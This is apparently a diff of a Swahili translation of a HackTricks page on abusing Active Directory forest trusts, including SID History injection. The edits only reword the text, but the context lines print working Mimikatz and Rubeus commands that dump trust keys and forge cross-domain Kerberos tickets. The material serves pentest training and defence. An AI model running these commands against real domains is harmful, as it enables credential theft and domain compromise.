@@ -93,12 +93,12 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 ```
 ### SID History Abuse
 
-Unaweza pia kutumia [**SID History**](sid-history-injection.md) kupitia uaminifu wa msitu.
+Unaweza pia kutumia vibaya [**SID History**](sid-history-injection.md) kupitia uaminifu wa msitu.
 
-Ikiwa mtumiaji anahamishwa **kutoka msitu mmoja hadi mwingine** na **SID Filtering haijawashwa**, inakuwa inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itakuwa **imeongezwa** kwenye **token ya mtumiaji** wakati wa uthibitishaji **kupitia uaminifu**.
+Ikiwa mtumiaji anahamishwa **kutoka msitu mmoja hadi mwingine** na **SID Filtering haijawashwa**, inakuwa inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itakuwa **imeongezwa** kwenye **token ya mtumiaji** wakati wa kuthibitisha **kupitia uaminifu**.
 
 {% hint style="warning" %}
-Kumbuka, unaweza kupata funguo ya kusaini na
+Kama ukumbusho, unaweza kupata funguo ya kusaini na
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
@@ -115,7 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Njia kamili ya kujifanya kuwa mtumiaji
+### Njia kamili ya kujifanya mtumiaji
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -138,7 +138,7 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
